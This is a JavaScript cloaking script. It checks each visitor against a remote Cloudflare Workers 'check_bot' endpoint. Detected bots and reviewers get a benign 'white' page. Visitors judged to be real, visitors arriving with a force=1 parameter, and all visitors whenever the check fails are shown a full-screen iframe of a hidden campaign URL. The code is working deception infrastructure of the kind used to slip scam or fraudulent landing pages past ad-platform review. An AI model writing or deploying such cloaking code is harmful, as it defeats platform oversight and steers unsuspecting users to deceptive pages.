const createLoader = () => {
  const frame = document.createElement('iframe');
  frame.id = 'load_frame';
  frame.src = 'frameLoad.html';
  frame.frameBorder = 0;
  frame.width = '100%';
  frame.height = '100%';
  frame.style.position = 'fixed';
  frame.style.top = 0;
  frame.style.left = 0;
  frame.style.width = '100%';
  frame.style.height = '100%';
  frame.style.zIndex = 9999;
  document.body.prepend(frame);
};

const showWhite = () => {
  const body = document.body;
  body.classList.remove('hidden');
  body.removeAttribute('hidden');
  body.style.overflow = 'auto';
  const preload = document.getElementById('load_frame');
  if (preload) preload.remove();
};

const showBlack = (blackUrl) => {
  const body = document.body;
  body.innerHTML = '';
  body.style.margin = '0';
  body.style.padding = '0';
  body.style.overflow = 'hidden';

  const frame = document.createElement('iframe');
  frame.id = 'wrapper_frame';
  frame.src = blackUrl;
  frame.style.cssText = `
    position:fixed;top:0;left:0;width:100vw;height:100vh;
    border:none;z-index:10000;display:block;background:#000;
  `;
  body.appendChild(frame);
  body.removeAttribute('hidden');
  body.classList.remove('hidden');

  setTimeout(() => {
    const preload = document.getElementById('load_frame');
    if (preload) preload.remove();
  }, 200);
};

createLoader();

window.addEventListener('DOMContentLoaded', () => {
  const qs = location.search || '';
  const workerURL = 'https://young-dust-76ba.eoabraxasoo56riftoui.workers.dev/loader/api/check_bot' + qs;

  fetch(workerURL)
    .then(r => r.json())
    .then(res => {
      console.log('check_bot response:', res);
      console.log('Client IP forwarded:', res.clientIP);

      const force = new URLSearchParams(location.search).get('force') === '1';

      if (force) {
        console.log('FORCE=1 → iframe от result');
        showBlack((res.campaign || 'https://app.get-superhum.com/NJnzqTf7') + qs);
        return;
      }

      if (res.code === 200 && res.result === false) {
   
        showBlack((res.campaign || 'https://app.get-superhum.com/NJnzqTf7') + qs);
      } else {
    
        showWhite();
      }
    })
    .catch(e => {
      console.error('error resp:', e);
      
      showBlack('https://app.get-superhum.com/NJnzqTf7' + (location.search || ''));
    });
});